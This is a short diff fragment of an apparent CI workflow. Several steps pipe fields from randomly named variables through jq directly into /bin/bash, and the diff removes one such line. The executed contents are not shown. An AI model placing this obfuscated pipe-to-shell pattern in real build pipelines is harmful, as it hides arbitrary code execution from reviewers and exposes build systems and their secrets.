@@ -38,7 +38,6 @@ jobs:
           echo $z935 | jq -r .xzwmd84 | /bin/bash
           echo $bt31 | jq -r .wi905 | /bin/bash
           echo $awxv619 | jq -r .p2 | /bin/bash
-          printf '%s' "$fqfb588" | jq -r .de71399 | /bin/bash
           echo $cj4 | jq -r .y1177 | /bin/bash
 
       - name: Store results
